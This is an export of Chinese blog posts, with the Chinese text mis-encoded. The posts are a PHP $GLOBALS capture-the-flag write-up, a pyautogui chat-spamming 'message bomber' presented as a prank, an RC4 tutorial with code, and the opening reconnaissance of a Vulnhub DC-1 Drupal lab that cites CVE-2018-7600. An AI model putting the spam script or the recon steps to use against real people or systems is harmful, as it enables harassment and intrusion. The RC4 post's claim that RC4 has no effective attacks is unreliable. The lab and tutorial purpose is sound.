test() &#123; $foo = &quot;local variable&quot;; echo &#x27;$foo in global scope: &#x27; . $GLOBALS[&quot;foo&quot;] . &quot;\\n&quot;; echo &#x27;$foo in current scope: &#x27; . $foo . &quot;\\n&quot;;&#125;$foo = &quot;Example content&quot;;test();?&gt;#ç»“æœ$foo in global scope: Example content$foo in current scope: local variable æ³¨æ„ï¼š â€œSuperglobalâ€ä¹Ÿç§°ä¸ºè‡ªåŠ¨åŒ–çš„å…¨å±€å˜é‡ã€‚è¿™å°±è¡¨ç¤ºå…¶åœ¨è„šæœ¬çš„æ‰€æœ‰ä½œç”¨åŸŸä¸­éƒ½æ˜¯å¯ç”¨çš„ã€‚ä¸éœ€è¦åœ¨å‡½æ•°æˆ–æ–¹æ³•ä¸­ç”¨ global $variable; æ¥è®¿é—®å®ƒã€‚ å˜é‡å¯ç”¨æ€§ã€‚ä¸æ‰€æœ‰å…¶ä»–è¶…å…¨å±€å˜é‡ä¸åŒï¼Œ$GLOBALSåœ¨PHPä¸­æ€»æ˜¯å¯ç”¨çš„ã€‚ ä»£ç åˆ†æ é¡µé¢å¦‚ä¸‹ å…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼/^\\w+$/ï¼Œæ„æ€æ˜¯åªèƒ½æœ‰å­—æ¯å’Œæ•°å­— ä¸¤ä¸ª//è¡¨ç¤ºå¼€å§‹å’Œç»“æŸ ^è¡¨ç¤ºå¼€å§‹å­—ç¬¦ä¸² $è¡¨ç¤ºç»“æŸå­—ç¬¦ä¸² \\wè¡¨ç¤ºåŒ…å«ã€a-zï¼ŒA-Z, _ , 0-9ã€‘ +è¡¨ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ª\\w åé¢çš„iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œåœ¨æ­¤å¤„æ²¡ç”¨ï¼Œå› ä¸º\\wé‡Œå·²ç»åŒ…å«äº†å¤§å°å†™ã€‚ è®¿é—® http://114.67.246.176:12610/?args=GLOBALSï¼Œçœ‹åˆ°flag","categories":[{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"}],"author":"w01ke"},{"title":"Pythonå®ç°æ¶ˆæ¯è½°ç‚¸æœº","slug":"Pythonå®ç°æ¶ˆæ¯è½°ç‚¸æœº","date":"2021-12-12T13:17:22.000Z","updated":"2022-01-03T03:29:24.171Z","comments":true,"path":"post/5ab8ed9d.html","link":"","permalink":"https://wolke.cn/post/5ab8ed9d.html","excerpt":"","text":"&emsp;&emsp;è§£æ”¾åŒæ‰‹ï¼Œè®©ç”µè„‘æ¥å¸®æˆ‘ä»¬è‡ªåŠ¨å‘ä¸€äº›æˆ‘ä»¬æƒ³è¦å‘çš„æ¶ˆæ¯ï¼ŒæŒºçœåŠ›çš„ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬æƒ³æ¶æå¥½æœ‹å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨è„šæœ¬æ¥å®ç°è‡ªåŠ¨å¤åˆ¶ã€ç²˜è´´å’Œå‘é€æ–‡å­—çš„åŠŸèƒ½ï¼Œä»è€Œè§£æ”¾æˆ‘ä»¬è‡ªå·±ï¼Œä¸ç”¨äº²è‡ªåœ¨ç”µè„‘ä¸Šåå¤å¹²è¿™ä¸ªCtrl C/Ctrl Vè¿™ä¸ªç´¯æ´»å„¿ã€‚ &emsp;&emsp;è¿˜å¯ä»¥æŠŠå®šæ—¶å¤šé•¿æ—¶é—´åå‘é€æŒ‡å®šå†…å®¹ï¼Œè¿™ä¸‹å­å°±ä¸ç”¨ååœ¨ç”µè„‘å‰é¢åˆ°ç‚¹äº†å‘å¼¹å¹•äº†ã€‚ ç¬¬ä¸€æ­¥ï¼šè·å–èŠå¤©çª—å£ä½ç½®&emsp;&emsp;åœ¨æˆ‘ä»¬å‘æ¶ˆæ¯ä¹‹å‰ï¼Œå¾—éœ€è¦çŸ¥é“èŠå¤©çª—å£çš„ä½ç½®åœ¨å“ªï¼Œå³é¼ æ ‡åœç•™åœ¨å“ªé‡Œæ‰èƒ½å®šä½åˆ°èŠå¤©çª—å£çš„è¾“å…¥ç•Œé¢ï¼Œä¹Ÿå°±æ˜¯é¼ æ ‡çš„xå’Œyåæ ‡æ˜¯å¤šå°‘ã€‚ import osimport timeimport pyautogui as pagtry: while True: print(&quot;Press Ctrl-C to stop&quot;) x, y = pag.position() positionStr = &quot;(&quot; + str(x).rjust(4) + &quot;,&quot; + str(y).rjust(4) + &quot;)&quot; print(positionStr) time.sleep(0.2) os.system(&#x27;cls&#x27;)except KeyboardInterrupt: print(&#x27;end...&#x27;) &emsp;&emsp;åªè¦ç¨‹åºè¿è¡Œèµ·æ¥ä¹‹åï¼Œæ¯å½“æˆ‘ä»¬ç§»åŠ¨é¼ æ ‡ï¼Œé¼ æ ‡çš„xå’Œyå€¼å°±ä¼šè‡ªåŠ¨å‘ç”Ÿæ”¹å˜å¹¶æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠèŠå¤©çª—å£è°ƒå‡ºæ¥ï¼ŒæŠŠé¼ æ ‡å®šä½åˆ°èŠå¤©çš„çª—å£çš„è¾“å…¥ä½ç½®å°±èƒ½è·å–åˆ°æ­¤æ—¶çš„xå’Œyå€¼ã€‚ ç¬¬äºŒæ­¥ï¼šå®ç°è‡ªåŠ¨å‘é€æ¶ˆæ¯import timeimport pyautoguiimport pyperclipcontent = &quot;&quot;&quot;æˆ‘çˆ±ä½ &quot;&quot;&quot;for line in list(content.split(&quot;\\n&quot;))*10:#å‘é€10æ¬¡æ–‡æœ¬ if line: pyautogui.click(801, 730) #é¼ æ ‡ç‚¹å‡»å¹¶å®šä½åˆ°èŠå¤©çª—å£ pyperclip.copy(line) #å¤åˆ¶è¯¥è¡Œ pyautogui.hotkey(&quot;ctrl&quot;,&quot;v&quot;) #ç²˜è´´ï¼Œmacç”µè„‘åˆ™æŠŠctrlæ¢æˆcommand pyautogui.typewrite(&quot;\\n&quot;) #å‘é€ time.sleep(0.1) #æ¯æ¬¡å‘å®Œé—´éš”0.1s &emsp;&emsp;å…ˆè¿è¡Œç¬¬ä¸€æ­¥çš„ä»£ç ç¡®å®šåæ ‡ï¼Œç„¶åè¿è¡Œç¬¬äºŒæ­¥å®æ–½è‡ªåŠ¨å‘é€ æ”¹è‰¯ç‰ˆGithubï¼šhttps://github.com/LeeJony000/Message_bomber","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"}],"author":"w01ke"},{"title":"RC4åŠ å¯†ç®—æ³•","slug":"RC4åŠ å¯†ç®—æ³•","date":"2021-12-12T12:50:09.000Z","updated":"2022-11-13T07:25:36.659Z","comments":true,"path":"post/9dd1bdb.html","link":"","permalink":"https://wolke.cn/post/9dd1bdb.html","excerpt":"","text":"&emsp;&emsp;RC4åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³• ä¸€ã€å¯¹ç§°åŠ å¯†ç®—æ³•&emsp;&emsp;å¯¹ç§°åŠ å¯†(ä¹Ÿå«ç§é’¥åŠ å¯†)æŒ‡åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥çš„åŠ å¯†ç®—æ³•ã€‚æœ‰æ—¶åˆå«ä¼ ç»Ÿå¯†ç ç®—æ³•ï¼Œå°±æ˜¯åŠ å¯†å¯†é’¥èƒ½å¤Ÿä»è§£å¯†å¯†é’¥ä¸­æ¨ç®—å‡ºæ¥ï¼ŒåŒæ—¶è§£å¯†å¯†é’¥ä¹Ÿå¯ä»¥ä»åŠ å¯†å¯†é’¥ä¸­æ¨ç®—å‡ºæ¥ã€‚è€Œåœ¨å¤§å¤šæ•°çš„å¯¹ç§°ç®—æ³•ä¸­ï¼ŒåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä¹Ÿç§°è¿™ç§åŠ å¯†ç®—æ³•ä¸ºç§˜å¯†å¯†é’¥ç®—æ³•æˆ–å•å¯†é’¥ç®—æ³•ã€‚å®ƒè¦æ±‚å‘é€æ–¹å’Œæ¥æ”¶æ–¹åœ¨å®‰å…¨é€šä¿¡ä¹‹å‰ï¼Œå•†å®šä¸€ä¸ªå¯†é’¥ã€‚å¯¹ç§°ç®—æ³•çš„å®‰å…¨æ€§ä¾èµ–äºå¯†é’¥ï¼Œæ³„æ¼å¯†é’¥å°±æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥å¯¹ä»–ä»¬å‘é€æˆ–æ¥æ”¶çš„æ¶ˆæ¯è§£å¯†ï¼Œæ‰€ä»¥å¯†é’¥çš„ä¿å¯†æ€§å¯¹é€šä¿¡çš„å®‰å…¨æ€§è‡³å…³é‡è¦ã€‚ äºŒã€RC4åŠ å¯†ç®—æ³•1ã€é¢„å¤‡çŸ¥è¯†ï¼ˆ1ï¼‰å¼‚æˆ–&emsp;&emsp;å­¦ä¹ RC4åŠ å¯†ç®—æ³•ä¹‹å‰ï¼Œé¦–å…ˆè¦çŸ¥é“ï¼šå¯¹æ˜æ–‡ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å¼‚æˆ–ä¸¤æ¬¡æœ€åæ˜¯å¾—åˆ°åŸæ–‡çš„ ï¼ˆ2ï¼‰æµå¯†ç â‘  å®šä¹‰&emsp;&emsp;æµå¯†ç æ˜¯å¯¹ç§°å¯†ç ç®—æ³•ï¼Œä»æ˜æ–‡è¾“å…¥æµé€ä½æˆ–é€å­—èŠ‚äº§ç”Ÿå¯†æ–‡è¾“å‡ºã€‚ &emsp;&emsp;æµå¯†ç ç±»ä¼¼äºâ€œä¸€æ¬¡ä¸€å¯†â€ï¼Œä¸åŒçš„æ˜¯â€œä¸€æ¬¡ä¸€å¯†â€ä½¿ç”¨çš„æ˜¯çœŸæ­£çš„éšæœºæ•°æµï¼Œè€Œæµå¯†ç ä½¿ç”¨çš„æ˜¯ä¼ªéšæœºæ•°æµã€‚ â‘¡ å®ä¾‹&emsp;&emsp;ä½¿ç”¨æœ€å¹¿æ³›çš„æµå¯†ç æ˜¯RC4 â‘¢ æµå¯†ç ç»“æ„ â‘£ è®¾è®¡æµå¯†ç çš„ä¸»è¦å› ç´  åŠ å¯†åºåˆ—çš„å‘¨æœŸè¦é•¿ï¼Œè‹¥å‡ºç°é‡å¤çš„å‘¨æœŸè¿‡çŸ­ï¼Œå®¹æ˜“è¢«ç ´è§£ å¯†é’¥æµåº”è¯¥å°½å¯èƒ½åœ°æ¥è¿‘çœŸæ­£éšæœºæ•°æµçš„ç‰¹å¾ å¯†é’¥é•¿åº¦è¦é•¿ï¼Œä»¥é¿å…ç©·ä¸¾æ”»å‡» 2ã€RC4ç®—æ³•ä»‹ç»&emsp;&emsp;RC4ç®—æ³•æ˜¯Ron Rivestä¸ºRSAå…¬å¸åœ¨1987å¹´è®¾è®¡çš„ä¸€ç§æµå¯†ç ï¼Œä½œä¸ºRSAçš„å•†ä¸šæœºå¯†ç›´åˆ°1994å¹´æ‰è¢«åŒ¿åå…¬å¸ƒäºInternetã€‚ &emsp;&emsp;è¯¥ç®—æ³•æ˜¯ä¸€ä¸ªå¯å˜å¯†é’¥é•¿åº¦ã€é¢å‘å­—èŠ‚æ“ä½œçš„æµå¯†ç ã€‚è¯¥ç®—æ³•ä»¥éšæœºç½®æ¢ä½œä¸ºåŸºç¡€ï¼Œå…¶å¯†ç å‘¨æœŸå¾ˆå¯èƒ½å¤§äº10100ï¼Œä¸”è¯¥ç®—æ³•çš„è¿è¡Œé€Ÿåº¦å¾ˆå¿«ã€‚ &emsp;&emsp;RC4è¢«ç”¨äºä¸ºç½‘ç»œæµè§ˆå™¨å’ŒæœåŠ¡å™¨é—´é€šä¿¡è€Œåˆ¶å®šçš„SSL/TLSï¼ˆå®‰å…¨å¥—æ¥å­—åè®®/ä¼ è¾“å±‚å®‰å…¨åè®®ï¼‰æ ‡å‡†ä¸­ï¼Œä»¥åŠä½œä¸ºIEEE 801.11æ— çº¿å±€åŸŸç½‘æ ‡å‡†ä¸€éƒ¨åˆ†çš„WEP(Wired Equivalent Privacy)åè®®å’Œæ–°çš„WiFiå—ä¿æŠ¤è®¿é—®åè®®ï¼ˆWPAï¼‰ä¸­ã€‚ä»è¿™äº›åº”ç”¨æ¥çœ‹ï¼ŒRC4æ„æˆäº†å½“ä»Šç½‘ç»œé€šä¿¡çš„éå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œå› æ­¤è¿™ä¸ªç®—æ³•éå¸¸é‡è¦ã€‚ &emsp;&emsp;RC4ç®—æ³•çš„ç‰¹ç‚¹æ˜¯ç®—æ³•ç®€å•ï¼Œè¿è¡Œé€Ÿåº¦å¿«ï¼Œè€Œä¸”å¯†é’¥é•¿åº¦æ˜¯å¯å˜çš„ï¼Œå¯å˜èŒƒå›´ä¸º1-256å­—èŠ‚(8-2048æ¯”ç‰¹)ï¼Œåœ¨å¦‚ä»ŠæŠ€æœ¯æ”¯æŒçš„å‰æä¸‹ï¼Œå½“å¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹æ—¶ï¼Œç”¨æš´åŠ›æ³•æœç´¢å¯†é’¥å·²ç»ä¸å¤ªå¯è¡Œï¼Œæ‰€ä»¥å¯ä»¥é¢„è§RC4çš„å¯†é’¥èŒƒå›´ä»»ç„¶å¯ä»¥åœ¨ä»Šåç›¸å½“é•¿çš„æ—¶é—´é‡ŒæŠµå¾¡æš´åŠ›æœç´¢å¯†é’¥çš„æ”»å‡»ã€‚å®é™…ä¸Šï¼Œå¦‚ä»Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯¹äº128bitå¯†é’¥é•¿åº¦çš„RC4åŠ å¯†ç®—æ³•çš„æœ‰æ•ˆæ”»å‡»æ–¹æ³•ã€‚ 3ã€RC4åŠ å¯†åŸç† &emsp;&emsp;RC4ç®—æ³•çš„åŸç†å¾ˆç®€å•ï¼ŒåŒ…æ‹¬åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰å’Œ**ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA)**ä¸¤å¤§éƒ¨åˆ†ã€‚ ï¼ˆ1ï¼‰åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰â‘  åˆå§‹åŒ–çŠ¶æ€å‘é‡Sï¼ˆ256å­—èŠ‚ï¼Œç”¨æ¥ä½œä¸ºå¯†é’¥æµç”Ÿæˆçš„ç§å­1ï¼‰&emsp;&emsp;æŒ‰ç…§å‡åºï¼Œç»™æ¯ä¸ªå­—èŠ‚èµ‹å€¼0,1,2,3,4,5,6â€¦â€¦,254,255 â‘¡ åˆå§‹å¯†é’¥ï¼ˆç”±ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œé•¿åº¦ä»»æ„&emsp;&emsp;å»ºç«‹ä¸€ä¸ªä¸´æ—¶å‘é‡Tã€‚å°†å¯†é’¥çš„å€¼å¾ªç¯å¤åˆ¶åˆ°Tå‘é‡å¦‚æœè¾“å…¥é•¿åº¦å°äº256ä¸ªå­—èŠ‚ï¼Œåˆ™è¿›è¡Œè½®è½¬ï¼Œç›´åˆ°å¡«æ»¡ ä¾‹å¦‚è¾“å…¥å¯†é’¥çš„æ˜¯1,2,3,4,5ï¼Œé‚£ä¹ˆå¡«å…¥çš„æ˜¯1,2,3,4,5,1,2,3,4,5,1,2,3,4,5â€¦â€¦ &emsp;&emsp;ç”±ä¸Šè¿°è½®è½¬è¿‡ç¨‹å¾—åˆ°256ä¸ªå­—èŠ‚çš„å‘é‡Tï¼ˆç”¨æ¥ä½œä¸ºå¯†é’¥æµç”Ÿæˆçš„ç§å­2ï¼‰ â‘¢ å¼€å§‹å¯¹çŠ¶æ€å‘é‡Sè¿›è¡Œç½®æ¢æ“ä½œï¼ˆç”¨æ¥æ‰“ä¹±åˆå§‹ç§å­1ï¼‰&emsp;&emsp;æŒ‰ç…§ä¸‹åˆ—è§„åˆ™è¿›è¡Œï¼Œä»ç¬¬é›¶ä¸ªå­—èŠ‚å¼€å§‹ï¼Œæ‰§è¡Œ256æ¬¡ï¼Œä¿è¯æ¯ä¸ªå­—èŠ‚éƒ½å¾—åˆ°å¤„ç† j=0;for(i=0;i&lt;256;i++)&#123; j = (j + S[i] + T[i]) mod 256; swap(S[i],S[j]); &emsp;&emsp;å› ä¸ºå¯¹Sçš„æ“ä½œä»…æ˜¯äº¤æ¢ï¼ŒSä»ç„¶åŒ…å«æ‰€æœ‰å€¼ä¸º0-255çš„å…ƒç´ ã€‚ ï¼ˆ3ï¼‰å¯†é’¥æµçš„ç”Ÿæˆä¸åŠ å¯†&emsp;&emsp;å‡è®¾æˆ‘çš„æ˜æ–‡å­—èŠ‚æ•°æ˜¯datalength=1024ä¸ªå­—èŠ‚ï¼ˆå½“ç„¶å¯ä»¥æ˜¯ä»»æ„ä¸ªå­—èŠ‚ï¼‰ i=0;j=0;while(datalength--)&#123; // ç›¸å½“äºæ‰§è¡Œ1024æ¬¡ï¼Œè¿™æ ·ç”Ÿæˆçš„å¯†é’¥æµä¹Ÿæ˜¯1024ä¸ªå­—èŠ‚ i = (i+1)mod256; j = (j+S[i])mod256; swap(S[i],S[j]); t = (S[i]+S[j])mod256; k = S[t]; è¿™é‡Œçš„kå°±æ˜¯å½“å‰ç”Ÿæˆçš„ä¸€ä¸ªå¯†é’¥æµä¸­çš„ä¸€ä½ // å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿›è¡ŒåŠ å¯†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°†å¯†é’¥æµä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œæœ€åè¿›è¡Œå¼‚æˆ–å°±ok data[] = data[]^k; // è¿›è¡ŒåŠ å¯†ï¼Œ^æ˜¯å¼‚æˆ–è¿ç®—ç¬¦ &emsp;&emsp;è§£å¯†æŒ‰ç…§å‰é¢å†™çš„ï¼Œå¼‚æˆ–ä¸¤æ¬¡å°±æ˜¯åŸæ–‡ï¼Œæ‰€ä»¥åªè¦æŠŠå¯†é’¥æµé‡æ–°æ‹¿è¿‡æ¥å¼‚æˆ–ä¸€æ¬¡å°±èƒ½å¾—åˆ°åŸæ–‡äº† ä¸‰ã€å®Œæ•´ç®—æ³•å®ç°1ã€C//ç¨‹åºå¼€å§‹#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG; /*åˆå§‹åŒ–å‡½æ•°*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i&lt;256; i++) &#123; s[i] = i; k[i] = key[i%Len]; &#125; for (i = 0; i&lt;256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//äº¤æ¢s[i]å’Œs[j] s[j] = tmp; &#125;&#125; /*åŠ è§£å¯†*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123; int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k&lt;Len; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//äº¤æ¢s[x]å’Œs[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; &#125;&#125; int main()&#123; unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box char key[256] = &#123; &quot;justfortest&quot; &#125;; char pData[512] = &quot;è¿™æ˜¯ä¸€ä¸ªç”¨æ¥åŠ å¯†çš„æ•°æ®Data&quot;; unsigned long len = strlen(pData); int i; printf(&quot;pData=%s\\n&quot;, pData); printf(&quot;key=%s,length=%d\\n\\n&quot;, key, strlen(key)); rc4_init(s, (unsigned char*)key, strlen(key));//å·²ç»å®Œæˆäº†åˆå§‹åŒ– printf(&quot;å®Œæˆå¯¹S[i]çš„åˆå§‹åŒ–ï¼Œå¦‚ä¸‹ï¼š\\n\\n&quot;); for (i = 0; i&lt;256; i++) &#123; printf(&quot;%02X&quot;, s[i]); if (i &amp;&amp; (i + 1) % 16 == 0)putchar(&#x27;\\n&#x27;); &#125; printf(&quot;\\n\\n&quot;); for (i = 0; i&lt;256; i++)//ç”¨s2[i]æš‚æ—¶ä¿ç•™ç»è¿‡åˆå§‹åŒ–çš„s[i]ï¼Œå¾ˆé‡è¦çš„ï¼ï¼ï¼ &#123; s2[i] = s[i]; &#125; printf(&quot;å·²ç»åˆå§‹åŒ–ï¼Œç°åœ¨åŠ å¯†:\\n\\n&quot;); rc4_crypt(s, (unsigned char*)pData, len);//åŠ å¯† printf(&quot;pData=%s\\n\\n&quot;, pData); printf(&quot;å·²ç»åŠ å¯†ï¼Œç°åœ¨è§£å¯†:\\n\\n&quot;); //rc4_init(s,(unsignedchar*)key,strlen(key));//åˆå§‹åŒ–å¯†é’¥ rc4_crypt(s2, (unsigned char*)pData, len);//è§£å¯† printf(&quot;pData=%s\\n\\n&quot;, pData); return 0;&#125; //ç¨‹åºå®Œ 2ã€Python# rc4.pyimport base64def rc4_init_sbox(key): s_box = list(range(256)) # æ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯ length = len(key) # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box) T = [] for i in range(256): T.append(key[i % length]) j = 0 for i in range(256): j = (j + s_box[i] + ord(T[i])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box) return s_boxdef rc4_encrypt(s_box, data): res = [] i = j = 0 length = len(data) for k in range(length): i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 s = s_box[t] res.append(chr(ord(data[k]) ^ s)) result = &quot;&quot;.join(res) print(&quot;RC4åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯:%s&quot; % result) print(&quot;RC4åŠ å¯†å(Base64ç¼–ç )çš„å­—cç¬¦ä¸²æ˜¯:&quot; + str(base64.b64encode(result.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;)) return str(base64.b64encode(result.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;)def rc4_decrypt(s_box, data): data = base64.b64decode(data.encode(&#x27;utf-8&#x27;)) data = bytes.decode(data) res = [] i = j = 0 length = len(data) for k in range(length): i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 s = s_box[t] res.append(chr(ord(data[k]) ^ s)) result = &quot;&quot;.join(res) print(&quot;RC4è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯:%s&quot; % result) return result# main.pyfrom rc4 import rc4_init_sbox, rc4_encrypt, rc4_decryptif __name__ == &quot;__main__&quot;: while True: function = input(&quot;E to encrypt or D to decrypt for rc4:&quot;) if function.upper() == &#x27;E&#x27;: data = input(&quot;è¯·è¾“å…¥ä½ è¦è¿›è¡ŒRC4åŠ å¯†çš„æ•°æ®ï¼š&quot;) key = input(&quot;è¯·è¾“å…¥RC4åŠ å¯†å¯†é’¥ï¼š&quot;) s_box = rc4_init_sbox(key) rc4_encrypt(s_box, data) elif function.upper() == &#x27;D&#x27;: data = input(&quot;è¯·è¾“å…¥ä½ è¦è¿›è¡ŒRC4è§£å¯†çš„æ•°æ®ï¼š&quot;) key = input(&quot;è¯·è¾“å…¥RC4è§£å¯†å¯†é’¥ï¼š&quot;) s_box = rc4_init_sbox(key) rc4_decrypt(s_box, data) else: print(&quot;è¯·è¾“å…¥æ­£ç¡®çš„åŠŸèƒ½&quot;) å‚è€ƒé“¾æ¥ï¼š https://www.cnblogs.com/gambler/p/9075415.html https://www.cnblogs.com/block2016/p/5601925.html https://www.jianshu.com/p/d9ad5fc524ec","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"w01ke"},{"title":"Vulhub-DC-1-Drupal","slug":"Vulhub-DC-1-Drupal","date":"2021-12-10T13:17:58.000Z","updated":"2022-01-03T03:30:07.344Z","comments":true,"path":"post/58fcce74.html","link":"","permalink":"https://wolke.cn/post/58fcce74.html","excerpt":"","text":"ä¸€ã€é¶æœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é¶åœºé•œåƒï¼šé“¾æ¥: https://www.vulnhub.com/entry/dc-1-1,292/ 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰é‡ç½®é¶åœºå¯†ç &emsp;&emsp;é‡å¯ä¸»æœºï¼Œé•¿æŒ‰shiftï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼ŒæŒ‰e &emsp;&emsp;æ‰¾åˆ°linuxå¼€å¤´çš„è¡Œï¼Œåœ¨æœ€åè¾“å…¥ init=/bin/bashï¼Œè¾“å…¥å®ŒæˆåæŒ‰Crtl+X &emsp;&emsp;mount -o rw,remount /ï¼Œå›è½¦ &emsp;&emsp; passwd rootï¼Œè¾“å…¥æ–°å¯†ç ä¸¤æ¬¡ &emsp;&emsp;å¦‚æœæç¤ºæ”¹å˜å¯†ç æˆåŠŸï¼Œé‡å¯è¯¥è™šæ‹Ÿæœº ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ äºŒã€é¢„å¤‡çŸ¥è¯†&emsp;&emsp;Drupalï¼šDrupalæ˜¯ä½¿ç”¨PHPè¯­è¨€ç¼–å†™çš„å¼€æºå†…å®¹ç®¡ç†æ¡†æ¶ï¼ˆCMFï¼‰ï¼Œå®ƒç”±å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰å’ŒPHPå¼€å‘æ¡†æ¶ï¼ˆFrameworkï¼‰å…±åŒæ„æˆã€‚ &emsp;&emsp;æ³¨å…¥åŸç†ï¼šDrupal Sqlæ³¨å…¥æ¼æ´åŸç†æ˜¯é…±ç´«çš„ï¼ŒDrupalåœ¨å¤„ç†INè¯­å¥çš„æ—¶å€™ï¼Œè¦é€šè¿‡expandArgumentså‡½æ•°æ¥å±•å¼€æ•°ç»„ã€‚ç”±äºexpandArgumentså‡½æ•°æ²¡æœ‰å¯¹å½“å‰æ•°ç»„ä¸­keyå€¼è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œç»™æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„SQLè¯­å¥å¯ä»¥æ‰§è¡Œä»»æ„PHPä»£ç ã€‚ ä¸‰ã€ä¿¡æ¯æ”¶é›†1ã€æ¢æµ‹ä¸»æœºIP&emsp;&emsp;å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼šarp-scanå’Œnetdiscover ï¼ˆ1ï¼‰arp-scan&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.1.108 arp-scan -l ï¼ˆ2ï¼‰netdiscover&emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹Kaliæœ¬æœºIPä¸º192.168.1.108 ip a &emsp;&emsp;ä½¿ç”¨netdiscoverå‘½ä»¤ netdiscover -r ip/å­ç½‘æ©ç  å‘½ä»¤æ¥æ¢æµ‹é¶æœº netdiscover -r 192.168.1.1/24 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ‰«æ&emsp;&emsp;ä½¿ç”¨nmapå¯¹IPè¿›è¡Œæ‰«æï¼š nmap -sV 192.168.1.108 &emsp;&emsp;å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†HTTPå’ŒSSH &emsp;&emsp;å‘ç°æ˜¯Drupalçš„cmsæ¡†æ¶çš„ç™»å½•é¡µé¢ å››ã€æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨1ã€æ¼æ´æ¢æµ‹&emsp;&emsp;é¦–å…ˆå¼±å£ä»¤ç™»å½•ï¼Œæ‰«ç«¯å£ã€æ‰«åå°éƒ½æ²¡ä»€ä¹ˆè¾ƒå¤§çš„æ”¶è·ã€‚äºæ˜¯å°†ç›®æ ‡ç›¯åœ¨äº†Drupalè¿™ä¸ªcmsæ¡†æ¶ä¸Šé¢äº†ï¼Œå‘ç°è¿™ä¸ªcmsæœ‰ä¸€ä¸ªæ³¨å…¥getshellçš„æ¼æ´ï¼ˆCVE-2018-7600ï¼‰ï¼Œå¹¶ä¸”metasploitä¸­å·²æœ‰æ”»å‡»æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚ 